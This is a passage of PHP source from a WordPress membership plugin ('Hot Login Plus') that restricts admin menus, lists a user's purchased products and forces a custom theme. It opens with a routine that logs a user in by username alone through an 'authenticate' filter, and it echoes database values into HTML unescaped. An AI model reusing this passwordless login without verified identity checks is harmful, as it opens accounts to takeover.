		add_filter( 'authenticate', array(self::CLASS_NAME,'allow_programmatic_login'), 10, 3 );    // hook in earlier than other callbacks to short-circuit them
		$user = wp_signon( array( 'user_login' => $username ) );
		remove_filter( 'authenticate', array(self::CLASS_NAME,'allow_programmatic_login'), 10, 3 );
		
		
	
		if ( is_a( $user, 'WP_User' ) ) {
			wp_set_current_user( $user->ID, $user->user_login );
	
			if ( is_user_logged_in() ) {
				return true;
			}
		}
	
		return false;
		
	}
	

	public function estilos() {
		
		global $anderson_makiyama;
		
        wp_register_style( self::CLASS_NAME . "_estilos", $anderson_makiyama[self::PLUGIN_ID]->plugin_url  ."css/estilos.css" );
        wp_enqueue_style( self::CLASS_NAME . "_estilos");	
		
    }

	public function admin_estilos($hook) {

		if(strpos($hook,self::CLASS_NAME) === false && current_user_can('level_10')) return;
		
		wp_register_style(self::CLASS_NAME . '_admin', plugins_url('css/admin.css', __FILE__), array(), '1.0.0', 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin');
	 
		wp_register_style(self::CLASS_NAME . '_admin_dataTable', plugins_url('css/jquery.dataTables.css', __FILE__), array(), '1.0.0', 'all');
		wp_enqueue_style(self::CLASS_NAME . '_admin_dataTable');
			 
	 
	}

	public function admin_js($hook) {
		
		global $anderson_makiyama;
		
		if(strpos($hook,self::CLASS_NAME) === false ) return;
		
		wp_register_script( self::CLASS_NAME . "_js_datatables", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.dataTables.js',array('jquery') );
	 
		wp_enqueue_script( self::CLASS_NAME . "_js_datatables", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.dataTables.js' );
		
		wp_enqueue_script( self::CLASS_NAME . "_js_admin", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/admin.js' );
	 	wp_enqueue_media();
	}
	
	public function js() {
		
		global $anderson_makiyama;
		
		wp_deregister_script('jquery');
		
		wp_register_script( "jquery", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery-latest.min.js' );
		
		wp_enqueue_script( "jquery", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery-latest.min.js' );		

		wp_enqueue_script( self::CLASS_NAME . "_jqueryeasing", $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.easing.1.3.js', array('jquery') );
		 
	}	

	public function add_admin_menu_item(){			
				
		include('includes/add-admin-menu-item.php');
	
	}

	public function remove_the_dashboard () {
		
		if (current_user_can('level_10')) {
			return;
		} else {
		 
		global $menu, $submenu, $user_ID;
		$the_user = new WP_User($user_ID);
		
		reset($menu); $page = key($menu);
		
		while ((__('Dashboard') != $menu[$page][0]) && next($menu))
		$page = key($menu);
		
		if (__('Dashboard') == $menu[$page][0]) unset($menu[$page]);
		reset($menu); $page = key($menu);
		
		while (!$the_user->has_cap($menu[$page][1]) && next($menu))
		$page = key($menu);
		
		if (preg_match('#wp-admin/?(index.php)?$#',$_SERVER['REQUEST_URI']) && ('index.php' != $menu[$page][2]))
			wp_redirect(get_option('siteurl') . '/wp-admin/profile.php');
		}
	}
		
	public function remove_admin_bar_links(){
		global $wp_admin_bar, $user_level;
		
		get_currentuserinfo();

		if ($user_level >= 10) {

			return;

		}	
		
	   // Clean the AdminBar
		$nodes = $wp_admin_bar->get_nodes();
		
		$wp_admin_bar->remove_menu('wp-logo');
		$wp_admin_bar->remove_menu('site-name');
		$wp_admin_bar->remove_menu('search');
		$wp_admin_bar->remove_menu('notes'); //wp-admin-bar-notes
		
		//$wp_admin_bar->remove_menu('my-account');
		
	}

	public function mytheme_remove_help_tabs($old_help, $screen_id, $screen){
		global $user_level;
		
		get_currentuserinfo();

		if ($user_level < 10) {

			$screen->remove_help_tabs();

		}		
		
		return $old_help;
	}
	

	public static function makeData($data, $anoConta,$mesConta,$diaConta){
	   $ano = substr($data,0,4);
	   $mes = substr($data,5,2);
	   $dia = substr($data,8,2);
	   return date('Y-m-d',mktime (0, 0, 0, $mes+($mesConta), $dia+($diaConta), $ano+($anoConta)));	
	}
	
	public static function get_data_pt($data){
		$date = array();
		$date['Y'] = substr($data,0,4);
		$date['m'] = substr($data,5,2);
		$date['d'] = substr($data,8,2);
		return $date["d"] . "/". $date["m"] . "/" . $date["Y"];
	}
	
	public function deactivate_free_version(){
					
		//if(is_plugin_active('hot-login/index.php'))
			//deactivate_plugins('hot-login/index.php');
			
	}
	
	public function rodape(){
	
		include('includes/rodape.php');
		
	}
	

	public function add_extra_social_links( $user )
	{
		global $user_level, $wpdb, $user_ID;

		get_currentuserinfo();
		
		if ($user_level >= 10) {
		
			return;
		
		}	


		$table_name_produtos = $wpdb->prefix . self::CLASS_NAME . "_produtos";
		$table_name_usuarios = $wpdb->prefix . self::CLASS_NAME . "_usuarios"; 

		 //Pega todos os ids de produtos que o usuário tem Acesso
		 $paginas = $wpdb->get_results( $wpdb->prepare( 
			"
				SELECT tb_prod.*,tb_usu.* FROM $table_name_produtos tb_prod inner join $table_name_usuarios tb_usu on tb_usu.id_produto = tb_prod.id_produto
				where tb_usu.id_usuario = %d
			", 
			$user_ID 
		 ), ARRAY_A );
		

	        echo '<h3>Acesse Seus Produtos</h3>
			<ol>
			';

			foreach($paginas as $pagina){ //Monta Menu
				 
				 echo "
				 <li>
				 <a href='". $pagina["pagina_inicial"] . "' style='font-size:24px'>" . $pagina["nome_produto"] . "</a>
				 </li>
				 ";
				 
			}
			echo "</ol>";
	
	}

    public function get_template() {
        // return new name
        return 'hotplus';
    }
	
    public function set_theme() {
		global $anderson_makiyama;

		 $single_path = get_theme_root();
		 $single_path .= '/hotplus/single.php';
		 
		 if(is_file($single_path)){
		 
			add_filter('template', array($anderson_makiyama[self::PLUGIN_ID], 'get_template'));
			add_filter('stylesheet', array($anderson_makiyama[self::PLUGIN_ID], 'get_template'));
			
			add_filter('pre_option_stylesheet', array($anderson_makiyama[self::PLUGIN_ID], 'get_template'));
			add_filter('pre_option_template', array($anderson_makiyama[self::PLUGIN_ID], 'get_template'));
			
			add_filter( 'single_template', array($anderson_makiyama[self::PLUGIN_ID], 'get_single_template') );
			add_filter( 'template_include', array($anderson_makiyama[self::PLUGIN_ID], 'get_single_template') );
		
		 }
    }

	function get_single_template($single_template) {
				
		 $single_path = get_theme_root();
		 $single_path .= '/hotplus/single.php';
		 
		 return $single_path;
	}	
		
}



if(!isset($anderson_makiyama)) $anderson_makiyama = array();

$anderson_makiyama_indice = Anderson_Makiyama_Hot_Login_Plus::PLUGIN_ID;

$anderson_makiyama[$anderson_makiyama_indice] = new Anderson_Makiyama_Hot_Login_Plus();

add_filter("plugin_action_links_". $anderson_makiyama[$anderson_makiyama_indice]->plugin_basename, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'settings_link') );


add_filter("admin_menu", array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'options'),999);

register_activation_hook( __FILE__, array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'activation') );

add_action( 'wp_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'estilos'),999 );

add_action( 'wp_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'js') );

add_action( 'admin_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'admin_estilos') );

add_action( 'admin_enqueue_scripts', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'admin_js') );

add_action('init', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'hot_acesso'),1);

add_action('wp', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'restricoes_checker'));

add_action('wp_authenticate', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'bloqueia_login_wp'));

add_filter( 'logout_url',array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'my_logout'), 10, 2);

add_action( 'admin_bar_menu', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'remove_admin_bar_links'),200);

add_action('wp_before_admin_bar_render', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'add_admin_menu_item'), 0);
//add_action('admin_bar_menu', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'add_admin_menu_item'), 0);

add_filter( 'contextual_help', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'),'mytheme_remove_help_tabs'), 999, 3 );

add_filter( 'admin_menu', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'),'remove_the_dashboard') );

add_filter( 'the_content', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'),'monta_conteudo_pagina_inicial') );

add_action( 'admin_init', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'deactivate_free_version2'),1 );

add_action('update_option_active_plugins', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'deactivate_free_version'),999);

add_action('wp_footer', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'rodape'));

add_action( 'personal_options',  array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'add_extra_social_links' ),1);

//add_action( 'edit_user_profile',  array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'add_extra_social_links' ),1);

add_filter('the_content', array($anderson_makiyama[$anderson_makiyama_indice]->get_static_var('CLASS_NAME'), 'restricoes_de_listagens' ),1);

?>